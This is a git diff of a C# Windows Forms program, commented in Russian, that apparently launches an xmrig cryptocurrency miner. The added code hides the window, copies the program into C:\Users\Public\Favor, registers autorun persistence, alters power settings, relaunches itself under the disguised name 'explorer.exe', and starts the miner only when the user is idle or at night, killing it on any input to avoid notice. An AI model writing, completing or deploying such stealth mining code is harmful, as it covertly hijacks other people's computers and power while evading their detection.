@@ -16,13 +16,14 @@ namespace WindowsFormsApp1
 {
     public partial class Form1 : Form
     {
-        //Process srartProg;
         string progStartName;
         bool prog_started;
         string textTranslit;
         int idleTimeOld;
         string time;
+        int timeInt;
         int rigID;
+        bool hiden=false;
         
 
 
@@ -34,7 +35,8 @@ namespace WindowsFormsApp1
             //можно сделать и так, для компактрости
             //*****.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    
             //Это можно разделять как хочешь. Можно оставить только дату или только время
-            label4.Text = DateTime.Now.ToShortDateString() + ", " + DateTime.Now.ToLongTimeString();
+
+            //label4.Text = DateTime.Now.ToShortDateString() + ", " + DateTime.Now.ToLongTimeString();
 
             //таймер. Просто таймер, который толкает функцию "tmrShow_Tick"
             Timer tmrShow = new Timer();
@@ -44,16 +46,17 @@ namespace WindowsFormsApp1
 
             progStartName = @"C:\Users\Public\Favor";
 
-            CopyDir copy = new CopyDir();
-            copy.copyDir(Environment.CurrentDirectory, progStartName);
-
+            /*
             Autorun autoR = new Autorun();
             //autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, "\"" + progStartName + "\" -autorun");
             autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName );
+            */
+            /*
+            CreateConfig cc = new CreateConfig();
+            cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", Environment.UserName);
+            */
 
         }
-        //C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-        //папка автозагрузки для win7
 
         struct LastInputInfo    //переменная для хранения времени бездействия системы
         {
@@ -81,45 +84,135 @@ namespace WindowsFormsApp1
 
 
 
-            time= DateTime.Now.ToString("HH.mm");
-
-            if (time == "00.00")
+            if (hiden == false && Environment.CurrentDirectory == @"C:\Users\Public\Favor")
             {
-                prog_started = false;
-                close_prog();
-                FileStatus stat = new FileStatus();
-                stat.restart();
+                hiden = true;
+                Hide();
+
+                if (!File.Exists(Environment.CurrentDirectory + @"\json.txt"))
+                {
+                    string name = Environment.UserName;
+                    Translite trans = new Translite();
+                    trans.Tr2(name);
+
+                    CreateConfig cc = new CreateConfig();
+                    cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name);
+                    File.Create(Environment.CurrentDirectory + @"\json.txt");
+                }
+
+                if (!File.Exists(Environment.CurrentDirectory + @"\autorn.txt"))
+                {
+                    Autorun autoR = new Autorun();
+                    autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
+                    File.Create(Environment.CurrentDirectory + @"\autorn.txt");
+                }
+            }
+            else if (hiden == false && Environment.CurrentDirectory != @"C:\Users\Public\Favor")
+            {
+                idleTimeOld= Convert.ToInt32(DateTime.Now.ToString("ss"));
+                hiden = true;
+
+                CopyDir copy = new CopyDir();
+                copy.copyDir(Environment.CurrentDirectory, progStartName);
+
+                Autorun autoR = new Autorun();
+                autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
+
+                PowerSetings pow = new PowerSetings();
+                pow.SetSetings();
+
             }
 
-            //if (idleTime >= 7200000 && prog_started == false && time != "00.00")
+
+
+
+            if (Environment.CurrentDirectory == @"C:\Users\Public\Favor")
+            {
+                time = DateTime.Now.ToString("HH.mm");
+                if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + "/restart.txt"))
+                {
+                    prog_started = false;
+                    close_prog();
+                    FileStatus stat = new FileStatus();
+                    stat.restart();
+                }
+
+                timeInt = Convert.ToInt32(DateTime.Now.ToString("HH"));
+                if ((timeInt < 5 || timeInt > 22) && idleTime >= 1200000 && prog_started == false && time != "00.00")
+                {
+                    prog_started = true;
+                    start_prog();
+                }
+
+                //if (idleTime >= 3600000 && prog_started == false && time != "00.00")
                 if (idleTime >= 5000 && prog_started == false && time != "00.00")
                 {
-                prog_started = true;
-                start_prog();
-            }
-
-            if (idleTime <= 100 && prog_started == true)
-            {
-                prog_started = false;
-                close_prog();
-            }
-
-            if (File.Exists(Environment.CurrentDirectory + "/restart.txt"))
-            {
-                File.Delete(Environment.CurrentDirectory + "/restart.txt");
-                prog_started = true;
-                start_prog();
-            }
-
-            if (checkBox1.Checked == true)      //проверяет показывать ли в текствоксе когда пользователь ёрзает
-            {
-                if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
-                {
-                    printString(DateTime.Now.ToString("HH.mm.ss") + " Last input.", true);
+                    prog_started = true;
+                    start_prog();
                 }
-                idleTimeOld = idleTime;
+
+                if (idleTime <= 100 && prog_started == true)
+                {
+                    prog_started = false;
+                    close_prog();
+                }
+
+                if (File.Exists(Environment.CurrentDirectory + "/restart.txt") && time == "00.01")
+                {
+                    File.Delete(Environment.CurrentDirectory + "/restart.txt");
+                    prog_started = true;
+                    start_prog();
+                }
+
+                if (checkBox1.Checked == true)      //проверяет показывать ли в текствоксе когда пользователь ёрзает
+                {
+                    if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
+                    {
+                        printString(DateTime.Now.ToString("HH.mm.ss") + " Last input.", true);
+                    }
+                    idleTimeOld = idleTime;
+                }
+            }
+            else 
+            {
+                timeInt = Convert.ToInt32(DateTime.Now.ToString("ss"));
+
+                if (idleTimeOld <= 57)
+                {
+                    //printInt(idleTimeOld + "  " + time, false);
+                    if (idleTimeOld == timeInt-3)
+                    { /*
+                        System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
+                        srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
+                        srartProg.Start();
+                        */
+                        Process.Start(@"C:\Users\Public\Favor\explorer.exe"); 
+                        Environment.Exit(0);
+
+                    }
+                }
+                else
+                {
+                    //printInt(idleTimeOld + "  " + time, false);
+                    if (timeInt == 2)
+                    { /*
+                        System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
+                        srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
+                        srartProg.Start();
+                        */
+                        Process.Start(@"C:\Users\Public\Favor\explorer.exe"); 
+                        Environment.Exit(0);
+
+                    }
+                }
             }
         }
+
+
+
+
+
+
 
         private void start_prog()
         {
@@ -130,27 +223,32 @@ namespace WindowsFormsApp1
                 srartProg.Start();
                 //srartProg = Process.Start("xmrig.exe");
                 rigID = srartProg.Id;
+                Process.GetProcessById(rigID).PriorityClass = ProcessPriorityClass.BelowNormal;
                 prog_started = true;
                 
             }
-            catch (Exception ex)
+            catch //(Exception ex)
             {
-                MessageBox.Show(ex.Message , "Start");
-                prog_started = true;
+                //MessageBox.Show(ex.Message , "Start");
+                prog_started = false;
             }
         }
+
+
+
+
+
 
         private void close_prog()
         {
             try
             {
                     Process.GetProcessById(rigID).Kill();
-                    prog_started = false;
-                
+                    prog_started = false;                
             }
             catch 
             {
-                prog_started = false;
+                prog_started = true;
             }
         }
 
@@ -172,7 +270,7 @@ namespace WindowsFormsApp1
         {
             if (importmant == false)
             {
-                textBox1.Text = masage + Environment.NewLine + textBox1.Text;
+                textBox1.Text = Convert.ToString(masage) + Environment.NewLine + textBox1.Text;
             }
             else
             {
@@ -185,9 +283,6 @@ namespace WindowsFormsApp1
 
         private void button1_Click(object sender, EventArgs e)  //перезапускает
         {
-            //Application.Restart();
-            //File.ReadLines("input.txt").Skip(1).First();
-            //time = "00.00";
             FileStatus stat = new FileStatus();
             stat.restart();
         }
@@ -233,7 +328,7 @@ namespace WindowsFormsApp1
 
        
 
-        private void button7_Click(object sender, EventArgs e)
+        private void button7_Click(object sender, EventArgs e)      //транслит
         {
             Translite tr = new Translite();
             textTranslit = textBox1.Text;
@@ -242,20 +337,20 @@ namespace WindowsFormsApp1
 
         }
 
-        private void button9_Click(object sender, EventArgs e)
+        private void button9_Click(object sender, EventArgs e)      //создание конфига
         {
             //oWerlord для ноутбука, oVerlord для компа
             CreateConfig cc = new CreateConfig();
             cc.stringeditor2(@"C:\Users\Owerlord\Desktop\xmrig\config.json", "rigNameeeeeeeeeee", "1111");
         }
 
-        private void button10_Click(object sender, EventArgs e)
+        private void button10_Click(object sender, EventArgs e)     //установки настроек Спящих режимов
         {
             PowerSetings pow = new PowerSetings();
             pow.SetSetings();
         }
 
-        private void button11_Click(object sender, EventArgs e)
+        private void button11_Click(object sender, EventArgs e)     //просто создание папки
         {
             FolderCreate create = new FolderCreate();
             create.PathCreate(@"C:\Users\Owerlord\Desktop\112211");
